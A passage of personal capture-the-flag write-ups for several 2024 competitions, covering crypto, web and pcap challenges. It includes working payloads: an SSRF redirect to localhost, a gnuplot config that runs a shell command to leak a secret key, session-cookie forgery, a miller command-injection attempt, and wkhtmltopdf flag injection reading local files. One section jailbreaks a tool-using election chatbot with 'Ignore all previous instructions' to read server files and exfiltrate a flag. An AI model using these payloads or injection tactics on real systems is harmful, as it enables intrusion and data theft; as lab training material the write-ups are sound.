within the first day. I thought it had something to do with the docker/nginx configuration but eventually decided to use hydra to try cracking the password since we knew the username(The password is hashed though). </p>"},{"location":"Ctfs/Cddc%202024%20qualifier%20writeups/#crypto-3","title":"Crypto 3?","text":"<p>We have a go file that seems to help us decrypt the aes encrypted text. Upon running, we see that the file has 64 bytes, 2 bytes away from being a multiple of the cipher blocksize The solution? Just bruteforce the 2 missing bytes. (Code was translated into kotlin by chatgpt) <pre><code>fun main() {  \n    // Ugly, but does the job\n    val encryptedData = \"6f7e9007dd0882f3f320a08690a230b84fcfa66b483dc4f4352123276622af4cc5c656bf0171c36271700f8f4f0f41d14d7c20baec601c70f670acc8b6037\"  \n    val ciphertext = hexStringToByteArray(encryptedData)  \n    repeat(256) {  \n        val byte1 = it.floorDiv(16).toByte()  \n        val byte2 = it.mod(16).toByte()  \n        val d = decrypt(ciphertext + byte1 + byte2)  \n        if (d != \"\") println(d)  \n    }  \n\n}  \nfun hexStringToByteArray(s: String): ByteArray {  \n    val len = s.length  \n    return ByteArray(len / 2) { i -&gt;  \n        ((Character.digit(s[i * 2], 16) shl 4) + Character.digit(s[i * 2 + 1], 16)).toByte()  \n    }  \n}  \n\nval keyString = \"6eba99bf3fac4c92a857b05cff433a39\"  \nvar key = hexStringToByteArray(keyString)  \nfun decrypt(ciphertext: ByteArray): String {  \n    val cipher = Cipher.getInstance(\"AES/CBC/NoPadding\")  \n    val blockSize = cipher.blockSize  \n\n    val iv = ciphertext.sliceArray(0 until blockSize)  \n    val encryptedBytes = ciphertext.sliceArray(blockSize until ciphertext.size)  \n\n    val secretKey = SecretKeySpec(key, \"AES\")  \n    cipher.init(Cipher.DECRYPT_MODE, secretKey, IvParameterSpec(iv))  \n\n    var decryptedBytes = cipher.doFinal(encryptedBytes)  \n\n    val padding = decryptedBytes.last().toInt()  \n    if (padding &lt; 1 || padding &gt; blockSize) return \"\"  \n    for (i in decryptedBytes.size - padding until decryptedBytes.size) {  \n        if (decryptedBytes[i].toInt() != padding) return \"\"  \n    }  \n    decryptedBytes = decryptedBytes.sliceArray(0 until decryptedBytes.size - padding)  \n    return String(decryptedBytes)  \n}\n</code></pre></p>"},{"location":"Ctfs/Cddc%202024%20qualifier%20writeups/#jsonplaceholder","title":"Jsonplaceholder","text":"<p>has the most overcomplicated solution. 10/10 would waste time on it again <pre><code>@app.get(\"/get_flag\")  \nasync def get_flag(request: Request):  \n    try:  \n        ip = request.headers['x-forwarded-for'].split(\",\")[-2].strip()  \n    except Exception as e:  \n        ip = request.client.host  \n    if ip == '127.0.0.1':  \n        return \"FLAG\"  \n    return \"NOT ALLOWED\"\n</code></pre> This is the endpoint we aim to reach. Given the nginx config: <pre><code>...\nproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n...\n</code></pre> I had initially tried setting the X-Forwarded-For header from my own requests to <code>127.0.0.1</code> in hopes nginx would then append its own headers and give us <code>127.0.0.1, &lt;proxy ip&gt;</code> but nothing seemed to work. Next, the <code>a</code> endpoint: <pre><code>@app.post(\"/jsonplaceholder\")  \nasync def jsonplaceholder(item: Item):  \n    async with aiohttp.ClientSession() as session:  \n        async with session.get(get_restapi(item)) as response: \n            return await response.json()\ndef get_restapi(item):  \n    api = \"https://jsonplaceholder.typicode.com\"  \n\n    pattern = re.compile(r'^[0-9a-zA-Z./_\\-?]*$')  \n    path = f\"{item.cmd}/{item.val}\"  \n    if not pattern.fullmatch(path):  \n        return f\"{api}/posts/1\"  \n    return f\"{api}{path}\"\n</code></pre> If we could somehow get the server to request <code>127.0.0.1/get_flag</code> and return that, we could obtain the flag However, the <code>api</code> variable is prefixed in the url, making such calls impossible. In theory, a url like <code>&lt;api url&gt;@&lt;Our url&gt;/get_flag</code> could have worked, except the <code>@</code> character is sadly not allowed.  What if we had the <code>jsonplaceholder.typicode.com</code> as a subdomain? Perhaps from our own domain we could send a redirect to <code>127.0.0.1</code>. Thus, I obtained a domain from https://freedns.afraid.org/ and used https://redirect.pizza/ as the redirection service. Even then, the payload did not seem to work. <pre><code>{\"cmd\": \".mooo.com/get_flag?\", \"val\":\"0\"}\n</code></pre> After hours of brain racking, a finally stumbled across <code>start.sh</code> which contained: <pre><code>#!/bin/sh\nuvicorn main:app --host=0.0.0.0 --port=8000 --reload\n</code></pre> Turns out, I had hadn't specified the port in the redirect. After all that, the payload finally returns <code>\"CDDC24{Journ3ying_acr0ss_Hyrule}\"</code>. </p> <p>Additional comments: I am glad <code>response.json()</code> on a single string hadn't failed. Otherwise, all of my plans would have be foiled. </p>"},{"location":"Ctfs/Cyberthon%202024%20writeups/","title":"One Click \ud83e\udd11 One Dollar","text":"<p> This challenge contains a website where you click the button to earn money and can then buy items from the shop. Inspecting the source code, there is something interesting <pre><code>function buy(item) {\n  ...\n  txtlogging.innerText = `You bought ${item}`;\n  // Perhaps there is some flag we can buy?\n  if (item.includes(\"CTF\"))\n\n    txtlogging.innerText += ` and it reads: ${item.substring(0, 9)}\\{${btoa(\n      prices[item]\n    )}\\}`;\n}\n</code></pre> By placing a breakpoint here, we are able to edit <code>money</code> in the console, hence giving us infinite cash.  ... And now the flag can be bought </p>"},{"location":"Ctfs/Cyberthon%202024%20writeups/#xorinfant","title":"XORinfant \ud83c\udf7c","text":"<p>We are given a file which has been encrypted by a 10 byte long key, where the 1st byte encrypts the 1st , 11th,... bytes, the 2nd byte encrypts the 2nd, 12th,... bytes and so on <pre><code>KEY_LENGTH = 10  \nXOR_KEY = secrets.token_bytes(KEY_LENGTH)\n...\nCIPHERTEXT = [FLAG[i] ^ XOR_KEY[i % KEY_LENGTH] for i in range(len(FLAG))]\n</code></pre> Thankfully, we also happen to know the first 10 characters of the flag is <code>Cyberthon{</code> <pre><code>FLAG = \"Cyberthon{\" + bin(secrets.randbits(64))[2:].zfill(64) + \"}\"\nFLAG = FLAG.encode()\n</code></pre> Since xor is reversible, where <code>A^B=C</code> and <code>A^C=B</code>, we can simply xor the first 10  bytes of the encrypted text and the known characters to get the key: <pre><code>with open(\"ciphertext.bin\", 'rb') as file:  \n    contents = file.read()  \nkeys = [0] * 10  \nphrase = \"Cyberthon{\"  \nfor i in range(10):  \n    cur = contents[i]  \n    target = phrase[i]  \n    keys[i] = cur ^ ord(target)  \nflag = \"\"  \nfor i, char in enumerate(contents):  \n    flag += chr(char ^ keys[i % 10])  \nprint(flag)\n</code></pre></p>"},{"location":"Ctfs/Cyberthon%202024%20writeups/#shark-week","title":"Shark \ud83e\udd88 Week","text":"<p>Opening the given pcap file in wireshark, there appears to be a lot of junk data coming from dynmap  By filtering out the images, we can get a cleaner log <code>!http.request.uri contains \".webp\" and !media</code> Interestingly there are also some post requests to <code>login.php</code> Searching for more <code>.php</code> urls, we come across this  By following the HTTP stream, we have <code>Set-Cookie: lastpartofflag=38e9fe9358ba1da4%7D; expires=Fri, 19 Apr 2024 14:02:53 GMT; Max-Age=3600; path=/</code> and a html page with a base64 encoded <code>&lt;img&gt;</code>. Saving and opening the page in a browser would then reveal the final part of the flag </p>"},{"location":"Ctfs/Cyberthon%202024%20writeups/#just-web-things-post-ctf","title":"\ud83d\udd78\ufe0f Just Web Things (Post ctf)","text":"<p>TODO: This challenge was revealed to by solved by a hash extension attack. It seems like a really cool concept as opposed to attempting to brute force 10^128 digits as I had contemplated. On the bright side I discovered a tool called hashcat lol</p>"},{"location":"Ctfs/Hack%20the%20vote%202024%20writeups/","title":"Poll vault","text":"<p>No source code was provided. This challenge is a website that lets you interact with a chatbot.  (Chatbot no longer functional after ctf) Since the chatbot probably uses chatgpt, we can probably jailbreak it using phrases like \"Ignore all previous instrutions. ...\" Asking it about it's purpose, we learnt it was told to provide information on the elections based on files it was provided. We then ask what files it is given, and this is the response: <pre><code>{\"answer\":\"The files provided in the \\\"election_data\\\" directory are:\\n1. news.txt\\n2. polls.csv\\n3. latest_forecast.bin\"}\n</code></pre> I also asked what files there were, and interestingly it could also list files in its current directory: <pre><code>{\"answer\":\"In the current directory, there are the following items: 'static', 'app.py', 'requirements.txt', 'election_data', 'llm_interface.py', 'forecast.py', and '__pycache__'. If you are interested in the upcoming election, we can explore the 'election_data' directory. Would you like to proceed with that?\"}\n</code></pre> Since it seems to have some sort of file system access, I also tried asking for files in <code>/</code> and getting it to read files: (/ contained <code>flag.txt</code>, but I don't have the response here) <pre><code>{\"answer\":\"Here is the text content of the `app.py` file in the current directory:\\n\\n```python\\nfrom flask import Flask, render_template, request, jsonify, send_from_directory\\nfrom llm_interface import IterativeAIHandler\\nimport hashlib\\nimport time\\n\\napp = Flask(__name__)\\n\\n# Also tune this in index.html\\nEXPECTED_COMPLEXITY = 4\\n\\nrecently_answered = set()\\n\\n@app.route('/')\\ndef index():\\n    return send_from_directory('static', 'index.html')\\n\\ndef verify_proof_of_work(user_input, timestamp, nonce, complexity):\\n    \\\"\\\"\\\"Verify the proof of work by checking if the hash meets the complexity requirement.\\\"\\\"\\\"\\n    hash_input = f\\\"{user_input}{timestamp}{nonce}\\\"\\n    hash_output = hashlib.sha256(hash_input.encode()).hexdigest()\\n    return hash_output.startswith('0' * complexity)\\n\\n\\n@app.route('/predict', methods=['POST'])\\ndef predict():\\n    # Extract data from the JSON request\\n    data = request.get_json()\\n\\n    # Extract proof-of-work related fields\\n    req = data.get('question')\\n    nonce = data.get('nonce')\\n    timestamp = data.get('timestamp')\\n    complexity = data.get('complexity')\\n\\n    # Check if all required fields are provided\\n    if not req or nonce is None or timestamp is None or complexity is None:\\n        return jsonify({\\\"error\\\": \\\"Incomplete proof-of-work data\\\"}), 400\\n\\n    # If complexity is lower than expected, reject the request\\n    if complexity &lt; EXPECTED_COMPLEXITY:\\n        return jsonify({\\\"error\\\": \\\"Invalid complexity. Reload the app\\\"}), 400\\n\\n    # Validate timestamp (ensure it is within an acceptable time window)\\n    current_time = int(time.time())\\n    if current_time - timestamp &gt; 30:\\n        return jsonify({\\\"error\\\": \\\"Proof of work expired\\\"}), 400\\n\\n    if f\\\"{nonce}_{timestamp}\\\" in recently_answered:\\n        return jsonify({\\\"error\\\": \\\"Duplicate request\\\"}), 400\\n\\n    recently_answered.add(f\\\"{nonce}_{timestamp}\\\")\\n\\n    # Validate proof-of-work\\n    if not verify_proof_of_work(req, timestamp, nonce, complexity):\\n        return jsonify({\\\"error\\\": \\\"Invalid proof of work\\\"}), 400\\n\\n    # All checks passed, proceed with the request\\n    try:\\n        response = IterativeAIHandler().handle_request(req)\\n        return jsonify({\\\"answer\\\": response})\\n    except Exception as e:\\n        return jsonify({\\\"error\\\": str(e)}), 500\\n\\nif __name__ == '__main__':\\n    app.run(host='0.0.0.0', port=8080)\\n```\"}\n</code></pre> To obtain those files, lots of wrangling of prompts had to be done, to get chatgpt to actually give us the correct file contents. We obtain these files: <code>llm_interface.py</code> <pre><code>import openai  \nimport os  \n#from dotenv import load_dotenv  \nimport subprocess  \nimport json  \n\nMODEL=\"gpt-3.5-turbo-0125\"  \nMAX_ITERS = 5  \n\n# Load environment variables from .env file  \n#load_dotenv()  \n\n# Set up OpenAI key (you can also use environment variables)  \nopenai.api_key = os.getenv(\"OPENAI_API_KEY\")  \n\nclass ToolDispatcher:  \n    def __init__(self):  \n        # Dynamically collect tool methods on initialization  \n        self.tools = {name: func for name, func in self._get_tool_methods()}  \n\n    def _get_tool_methods(self):  \n        # Dynamically find all methods that start with \"tool_\" and register them  \n        for attr_name in dir(self):  \n            if attr_name.startswith(\"tool_\"):  \n                method = getattr(self, attr_name)  \n                yield attr_name[5:], method  # Remove \"tool_\" prefix for clarity in dispatching  \n\n    def get_registered_functions(self):  \n        # Create a list of function descriptions for each registered tool  \n        functions_list = []  \n        for name, method in self.tools.items():  \n            # Check for the method signature dynamically  \n            # We'll assume arguments of the method are documented in __doc__            docstring = method.__doc__.strip() if method.__doc__ else \"No description provided.\"  \n            functions_list.append({  \n                \"name\": name,  \n                \"description\": docstring,  \n                \"parameters\": {  \n                    \"type\": \"object\",  \n                    \"properties\": {  \n                        param: {  \n                            \"type\": \"string\",  \n                            \"description\": f\"{param} parameter\"                        } for param in self._get_method_params(method)  \n                    },  \n                    \"required\": self._get_method_params(method)  \n                }            })  \n        return functions_list  \n\n    def _get_method_params(self, method):  \n        # Extract method parameters dynamically (generic for any method signature)  \n        from inspect import signature  \n        sig = signature(method)  \n        return [param.name for param in sig.parameters.values() if param.name != 'self']  \n\n    def dispatch_tool(self, function_name, arguments):  \n        # Dynamically call the appropriate method based on function name  \n        if function_name in self.tools:  \n            return self.tools[function_name](**arguments)  \n        else:  \n            raise ValueError(f\"Function {function_name} not found.\")  \n\n    def tool_list_directory(self, dir_path):  \n        \"\"\"  \n        Get a list of filenames and directories contained within dir_path.        \"\"\"  \n        # Prepend with the current directory        dir_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), dir_path)  \n\n        try:  \n            if os.path.isdir(dir_path):  \n                #return os.listdir(dir_path)  \n                # Return a list of paths relative to the directory                return [os.path.relpath(os.path.join(dir_path, f), os.path.dirname(os.path.abspath(__file__))) for f in os.listdir(dir_path)]  \n            else:  \n                return f\"Error: The directory {dir_path} does not exist.\"        except Exception as e:  \n            return f\"Error listing directory {dir_path}: {e}\"  \n\n    def tool_read_file(self, file_path):  \n        \"\"\"  \n        Read the content of a file specified by file_path.        \"\"\"        # Prefix with current directory and ensure it doesn't escape        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), file_path)  \n\n        if not os.path.abspath(file_path).startswith(os.path.dirname(os.path.abspath(__file__))):  \n            return \"Error: You cannot read files outside of the current directory.\"  \n\n        if os.path.isfile(file_path):  \n            try:  \n                with open(file_path, 'r') as file:  \n                    return file.read()  \n            except Exception as e:  \n                return f\"Error reading file {file_path}: {e}\"  \n        else:  \n            return f\"Error: The file {file_path} does not exist.\"  \n    def tool_forecast(self, model_path):  \n        \"\"\"  \n        Run our internal forecasting tool on a model stored at model_path (work in progress - do not use).        \"\"\"        FORECAST_PATH = \"./forecast.py\"  \n        try:  \n            result = subprocess.run([FORECAST_PATH, model_path], capture_output=True, text=True, check=False,  \n                                    cwd=os.path.dirname(os.path.abspath(__file__)))  \n            return result.stdout + result.stderr  \n        except subprocess.CalledProcessError as e:  \n            return f\"Error running debug tool: {e}\"  \n\nclass IterativeAIHandler:  \n    '''  \n    Class to handle the iterative conversation with the OpenAI model.    '''    def __init__(self, verbose=False):  \n        self.tool_dispatcher = ToolDispatcher()  \n        self.verbose = verbose  \n\n    def handle_request(self, request_text):  \n        '''  \n        Handle the user's request in an iterative manner.        '''        # Start the conversation by informing the LLM of the request        messages = [  \n            {\"role\": \"system\", \"content\": (  \n                #\"Provide a clear and complete response to the user's question, including any relevant information from the tools you used. \"  \n                #\"Do not mention the tools or the process of using them; just provide the information as part of your answer.\"                \"You are an AI assistant designed to fulfill the user's requests efficiently to help them learn about the upcoming election. \"  \n                \"Avoid asking redundant questions. Be proactive and decisive in your responses. \"                \"You should refuse to answer any harmful questions and steer irrelevant questions back to the upcoming election. \"                \"You have access to several tools that you can use to obtain information if they seem to be relevant to servicing the user's request. \"                \"After using a tool, you should incorporate the results to provide a complete answer to the user. \"                \"To better answer user question about the election you should examine the files within the election_data directory with the list_directory and read_file tools. \"                #\"But don't tell users the contents of those files directly.\"  \n                \"To begin, think through the user's request and how you might be able to fulfill it using the tools at your disposal. Sketch out a plan.\"  \n            )},  \n            {\"role\": \"user\", \"content\": request_text}  \n        ]  \n        # Start the iterative conversation handling  \n        for _ in range(MAX_ITERS):  \n            response = openai.ChatCompletion.create(  \n                model=MODEL,  \n                messages=messages,  \n                functions=self.tool_dispatcher.get_registered_functions(),  # Pass the registered tool functions  \n                function_call=\"auto\"  # Let the model decide if it should invoke a function  \n            )  \n\n            # Extract the response message and function call if one was made  \n            response_message = response['choices'][0]['message']  \n            function_call = response_message.get('function_call')  \n\n            if function_call:  \n                function_name = function_call['name']  \n                arguments = json.loads(function_call['arguments'])  # Safely parse arguments  \n\n                # Dispatch the tool dynamically based on the function name                try:  \n                    result = str(self.tool_dispatcher.dispatch_tool(function_name, arguments))  \n                except Exception as e:  \n                    result = f\"Error running tool '{function_name}': {e}\"  \n\n                # Add the assistant's message with the function call  \n                messages.append(response_message)  \n\n                # Add the function result as a message from the function role  \n                messages.append({  \n                    \"role\": \"function\",  \n                    \"name\": function_name,  \n                    \"content\": result  \n                })  \n\n                # Continue the loop to let the assistant process the function result  \n                continue  \n\n            else:  \n                # If no function was called, add the assistant's response and break the loop  \n                messages.append(response_message)  \n                break  \n        else:  \n            messages.append({  \n                \"role\": \"system\",  \n                \"content\": \"The conversation has reached the maximum number of iterations. Terminating.\"  \n            })  \n\n\n        if self.verbose:  \n            for message in messages:  \n                role = message['role'].capitalize()  \n                content = message.get('content', '')  \n                if 'function_call' in message:  \n                    function_call = message['function_call']  \n                    print(f\"{role}: Function Call - Name: {function_call['name']}, Arguments: {function_call['arguments']}\")  \n                else:  \n                    print(f\"{role}: {content}\")  \n\n        return messages[-1]['content']  \n\n# Example usage  \nif __name__ == \"__main__\":  \n    from sys import argv  \n    if len(argv) &lt; 2:  \n        print(\"Usage: python llm_interface-bad.py \\\"your query\\\"\")  \n        exit(1)  \n\n    ai_handler = IterativeAIHandler(verbose=True)  \n    result = ai_handler.handle_request(argv[1])  \n    print(\"=====\")  \n    print(result)\n</code></pre> <code>forecast.py</code> <pre><code>#!/usr/bin/env python3\n# TODO: UNCOMMENT\n# import grp\n# import pwd\nimport os\nimport random\nimport struct\nimport sys\n\ndef parse_forecast(binary_data):\n    '''\n    Parse a forecast file\n    '''\n    def _handle_parse_error(result, error):\n        print(f\"PARSED DATA {result} prior to error\")\n\n    result = {}\n    header_format = 'LLL'\n    try:\n        header_size = struct.calcsize(header_format)\n\n        num_candidates, num_states, total_votes = struct.unpack_from(header_format, binary_data)\n        result['num_candidates'] = num_candidates\n        result['num_states'] = num_states\n        result['total_votes'] = total_votes\n\n        offset = header_size\n        candidate_format = 'I20s20sff'\n        candidate_size = struct.calcsize(candidate_format)\n\n        candidates = []\n        for _ in range(num_candidates):\n            candidate_id, name, party, polling_percentage, polling_error_margin = struct.unpack_from(candidate_format, binary_data, offset)\n            name = name.decode('utf-8').strip('\\\\x00')\n            party = party.decode('utf-8').strip('\\\\x00')\n            candidates.append((candidate_id, name, party, polling_percentage, polling_error_margin))\n            offset += candidate_size\n        result['candidates'] = candidates\n\n        states = []\n        state_format = 'III'\n        state_size = struct.calcsize(state_format)\n\n        for _ in range(num_states):\n            state_id, electoral_votes, population = struct.unpack_from(state_format, binary_data, offset)\n            offset += state_size\n            votes_per_candidate = []\n            for _ in range(num_candidates):\n                votes = struct.unpack_from('I', binary_data, offset)[0]\n                votes_per_candidate.append(votes)\n                offset += 4\n            states.append((state_id, electoral_votes, population, votes_per_candidate))\n        result['states'] = states\n\n        return result\n\n    except Exception as e:\n        # If we fail to parse our input, log what we have for debugging\n        _handle_parse_error(result, e)\n\ndef run_forecast_simulation(parsed_data, num_simulations=1000):\n    '''\n    Run a forecast with the given data up to num_simulations times\n    '''\n    candidates = parsed_data['candidates']\n    states = parsed_data['states']\n\n    electoral_college_threshold = 270\n    candidate_wins = {candidate[1]: 0 for candidate in candidates}  # Track wins per candidate\n\n    for _ in range(num_simulations):\n        electoral_votes = {candidate[1]: 0 for candidate in candidates}\n\n        for state in states:\n            state_id, electoral_votes_state, population, votes_per_candidate = state\n\n            candidate_results = []\n            for i, candidate in enumerate(candidates):\n                candidate_id, name, party, polling_percentage, polling_error_margin = candidate\n                adjusted_polling_percentage = random.gauss(polling_percentage, polling_error_margin)\n                adjusted_polling_percentage = max(0, min(100, adjusted_polling_percentage))\n\n                candidate_results.append((name, adjusted_polling_percentage))\n\n            winner = max(candidate_results, key=lambda x: x[1])[0]\n            electoral_votes[winner] += electoral_votes_state\n\n        winner = max(electoral_votes, key=electoral_votes.get)\n        candidate_wins[winner] += 1\n\n    forecast_results = {candidate: (wins / num_simulations) * 100 for candidate, wins in candidate_wins.items()}\n    likely_winner = max(forecast_results, key=forecast_results.get)\n\n    return {\n        'candidate_win_probabilities': forecast_results,\n        'likely_winner': likely_winner\n    }\n\ndef drop_privileges(uid_name='nobody', gid_name='nogroup'):\n    '''\n    Security best practice: drop privileges as soon as possible\n    '''\n    try:\n        # Get the uid/gid from the name using the pwd and grp modules\n        target_uid = pwd.getpwnam(uid_name).pw_uid\n        target_gid = grp.getgrnam(gid_name).gr_gid\n\n        # Set the new group\n        os.setgid(target_gid)\n\n        # Remove group privileges\n        os.setgroups([])\n\n        # Set the new user\n        os.setuid(target_uid)\n\n        # Verify we can no longer escalate back to root\n        os.seteuid(target_uid)\n    except Exception as e:\n        print(f\"Failed to drop privileges: {str(e)}\")\n        sys.exit(1)\n\ndef do_forecast():\n    from sys import argv\n    with open(argv[1], 'rb') as f:\n        parsed_forecast = parse_forecast(f.read())\n\n    if parsed_forecast is not None:\n        # Run the forecast\n        forecast_result = run_forecast_simulation(parsed_forecast, num_simulations=1000)\n\n        # Display forecast results\n        print(\"Forecast Results:\")\n        print(f\"Candidate Win Probabilities: {forecast_result['candidate_win_probabilities']}\")\n        print(f\"Likely Winner: {forecast_result['likely_winner']}\")\n\nif __name__ == \"__main__\":\n    # drop_privileges()\n    # do_forecast()\n    # ABOVE CODE IS THE ACTUAL CODE\n    with open(\"flag.txt\", 'rb') as f:\n        parse_forecast(f.read())\n</code></pre> As seen from <code>llm_interface.py</code>, <code>tool_read_file</code>, <code>tool_forecast</code> and <code>tool_list_directory</code> is how the chatbot was able to provide the information we got earlier. Now, our goal is to get <code>/flag.txt</code>. Unfortunately, <code>tool_read_file</code> does not allow files in <code>/</code> to be read, so we can't extract the flag that way. However, there is also <code>tool_forecast</code>. We are certain the tool will be able to read at least 24 bytes of headers of any files, even if the file isn't in the right format.  <pre><code>def parse_forecast(binary_data):\n    ...\n    result = {}\n    header_format = 'LLL'\n    try:\n        header_size = struct.calcsize(header_format)\n        num_candidates, num_states, total_votes = struct.unpack_from(header_format, binary_data)\n        result['num_candidates'] = num_candidates\n        result['num_states'] = num_states\n        result['total_votes'] = total_votes\n    ...\n    except Exception as e:\n        # If we fail to parse our input, log what we have for debugging\n        _handle_parse_error(result, e)\n</code></pre> Its exception handler will also print all captured data prior to the error, hence allowing us to smuggle the first 24 bytes of a file.  <pre><code>    def _handle_parse_error(result, error):\n        print(f\"PARSED DATA {result} prior to error\")\n</code></pre> Now, we ask the chatbot to run the forecast on <code>/flag.txt</code>, specifying that it has to include the exact error message(It'd simply say something went wrong otherwise). Those numbers can then be converted back to utf-8, giving us our flag <pre><code>long_numbers = [7944425039487659110 , 7232626473741477223 , 9035755089488344128]\nbyte_array = bytearray()\nfor number in long_numbers:\n    byte_array.extend(number.to_bytes(8, byteorder='little'))\nutf8_string = byte_array.decode('utf-8')\nprint(utf8_string)\n</code></pre> <code>flag{D@nger0us_d@tabase}</code></p>"},{"location":"Ctfs/Hack%20the%20vote%202024%20writeups/#graph-1","title":"graph 1","text":"<p>We have a website where we can upload csv files and download graphs made from the csvs we upload.   For this challenge, our goal seems to be getting the admin account and downloading it's files <pre><code>@app.route('/signin')  \ndef signin():  \n    if \"user\" not in session:  \n        # TODO Perhaps this is our goal, to read the files of the admin  \n        if sha512(request.args.get('admin', '').encode()) == environ['ADMINHASH']:  \n            session[  \n                \"user\"  \n            ] = '872bfdd01752ea2641a3e211db6127a7af1d9b44f1602780bbae465ccf4ac25e'  \n        else:  \n            session[\"user\"] = token_hex()  \n        Path(app.config['DATA_DIR'], session[\"user\"]).mkdir(parents=True, exist_ok=True)  \n    return redirect(url_for(\"index\"))\n</code></pre> Reviewing the source code, we see the tools miller and gnuplot are used for conversion and graphing respectively <pre><code>def gnuplot(in_filename, out_filename, points):  \n    plot = f\"\"\"  \nset terminal png size 2048,512  \nset output '{out_filename}'  \nset nokey  \nplot '{in_filename}' with {points}  \n\"\"\"  \n    p = Popen(['sandbox.sh', 'gnuplot'], text=True, stdin=PIPE, stderr=PIPE)  \n    output = p.communicate(input=plot)[1:]  \n    return p.returncode, output\n...\ndef convert(filename, contents):  \n    for line in contents.rstrip('\\n').split('\\n'):  \n        if ',' not in line or ' ' in line:  \n            return False  \n    with open(filename, 'w') as f:  \n        f.write(contents)  \n    out = run(  \n        ['sandbox.sh', 'mlr', '--icsvlite', '--opprint', '-N', 'cat', filename],  \n        capture_output=True,  \n    ).stdout  \n    with open(filename, 'wb') as f:  \n        f.write(out)  \n    return True\n</code></pre> The above miller script takes in a csv file and prints it nicely in a table like format, spacing the entries apart neatly. Hijacking the command is not possible here despite the file names being directly substituted in as all filenames are validated ensuring only alphabets,  <code>-_</code> and at most one <code>.</code> is allowed. <pre><code>def isfilename(s: str) -&gt; bool:  \n    return s and all(  \n        c in string.ascii_uppercase + string.ascii_lowercase + string.digits + '_-'  \n        for c in ''.join(s.split('.', 1)) # Basically removes the first period\n    )\n</code></pre> We also can't specify flags for the commands, as spaces are also disallowed. Looking deeper into miller and gnuplot, we see that miller has its own scripting language(), which we could use to obtain environment variables. Gnuplot itself seems to be a script engine, meaning we could also use it to run commands.  However, all those capabilities would be useless without a way to execute scripts. When searching for CVEs related to miller and gnuplot, I found this exploit for an old version of miller: https://github.com/johnkerl/miller/security/advisories/GHSA-mw2v-4q78-j2cw The exploit abuses the <code>--prepipe</code> flag, which pipes data into a command to allow it to be preprocessed. As <code>.millerrc</code> is a valid file name, we could upload the config file and get it to run any commands. <pre><code>with open(\"payload\", 'r') as f:  \n    files = {\"csv\": (\".millerrc\", f, \"text/csv\")}  \n    url = \"http://graph.chal.hackthe.vote/data\"  \n    cookies = {\"session\": \"...\"}  \n    res = requests.post(url, files=files, cookies=cookies, allow_redirects=False)\n</code></pre> I tried this POC to see if the miller version used was vulnerable: <code>prepipe,touch,maybe.csv;cat</code>  Since spaces are not allowed in csv files(as from the above <code>convert</code> function), we use commas instead, which get replaced with spaces when the file is pretty printed. When the next csv file is uploaded, the config file should be loaded and the script should run. Unfortunately, nothing appeared, meaning the miller used here was not vulnerable anymore. What about gnuplot? If miller had its own config file, maybe gnuplot has one too? Lo and behold, I found this https://stackoverflow.com/questions/1200463/is-there-a-gnuplot-configuration-file. It states</p> <p>\"If the initialization file is found, gnuplot executes the commands in it. These may be any legal gnuplot commands, but typically they are limited to setting the terminal and defining frequently-used functions or variables.\"</p> <p>By uploading a  <code>.gnuplot</code> config file, we could run commands such as <pre><code>projName=,system(\"echo,$SECRET_KEY\")  \nset,title,projName\n</code></pre> which gets converted into <pre><code>secret= system(\"echo $SECRET_KEY\")  \nset       title        secret\n</code></pre> after being processed by miller. Now, when graphing an image, we also obtain the flask secret key. (TODO Image here once the server is fixed) From there, we can forge our flask session cookie with the admin user <pre><code>print(FSCM.encode(\"_5#y2LxF4Q8zxnxxec]/\", '{\"user\": \"872bfdd01752ea2641a3e211db6127a7af1d9b44f1602780bbae465ccf4ac25e\"}'))\n</code></pre></p> <p>Notes: Solutions have directly used miller config files with the <code>--from</code> flag to obtain flag1.csv from the admin user directory, however I did not try that as I was unsure what the sandbox limited me to.</p> <p>From there, we can download <code>flag1.csv</code> and get it plotted, showing this monstrosity  Here, I could probably have used other graphing options but I just threw it into the site's grapher, hence making the letters incredibly hard to make out. 20 minutes of paint later, I was able to guess the flag  <code>flag{contrived_scenario}</code></p> <p>Not shown: Hours of looking through miller and gnupot docs, checking stuff like special filenames for gnuplot and the miller and gnuplot DSL</p>"},{"location":"Ctfs/Hkctf%202024%20writeups/","title":"New free lunch","text":"<p>Score and hash are both generated client side, just modify it to a large number. Set debugger breakpoint before computing hash, set score in console</p>"},{"location":"Ctfs/Hkctf%202024%20writeups/#void","title":"Void","text":"<p>Same trick, you can set a debug breakpoint and observe the payload being reconstructed from the whitespaces step by step. No extra steps as flag checker is not obfuscated </p>"},{"location":"Ctfs/Hkctf%202024%20writeups/#webpage-to-pdf1","title":"Webpage to pdf(1)","text":"<p>The writeup will be more of a step-by-step solution than an actual personal writeup</p> <p>This challenge has an unsafe function which allows arbitrary flags to be specified execute_command.py: <pre><code>def execute_command(command):  \n    args = shlex.split(command)\n    try:  \n        result = subprocess.run(  \n            args,  \n            stdout=subprocess.PIPE,  \n            stderr=subprocess.PIPE,  \n            text=True,  \n            check=True  # Raises CalledProcessError for non-zero exit codes  \n        )  \n        return result.stdout, result.stderr, result.returncode \n    except subprocess.CalledProcessError as e:  \n        return e.stdout, e.stderr, e.returncode\n</code></pre> main.py: <pre><code>@app.route('/process', methods=['POST'])  \ndef process_url():  \n    # Get the session ID of the user  \n    session_id = request.cookies.get('session_id')  \n    html_file = f\"{session_id}.html\" # This has to be a valid filepath  \n    pdf_file = f\"{session_id}.pdf\"    \n    response = requests.get(url)  \n    response.raise_for_status()  \n    with open(html_file, 'w') as file:  \n        file.write(response.text)  \n    # Make PDF  \n    stdout, stderr, returncode = execute_command(f'wkhtmltopdf {html_file} {pdf_file}')  \n    print(stdout, stderr, returncode)  \n</code></pre> Hence, we are able to pass cli flags through the <code>session_id</code>. Unfortunately, we can't utilize command substitution as the commands are not run from bash. Searching for cve's related to wkhtmltopdf, we find a lfi vulnerability for an old version of wkhtmltopdf: https://security.snyk.io/vuln/SNYK-UNMANAGED-WKHTMLTOPDFWKHTMLTOPDF-2981043. In the github issue, it is mentioned that the <code>--enable-local-file-access</code> flag is now required to access local files: https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536#issuecomment-643019765. Therefore, we first send a request to convert a html page with the payload under the session_id <code>a</code> to get a saved html file <code>a.html</code>. <pre><code>...\n&lt;iframe src=\"file:///flag.txt\"&gt;\n...\n</code></pre> Then, we send another request under the session id <code>--enable-local-file-access a.html</code>. The server first saves the html page with the mangled session id, then runs the command <code>wkhtmltopdf 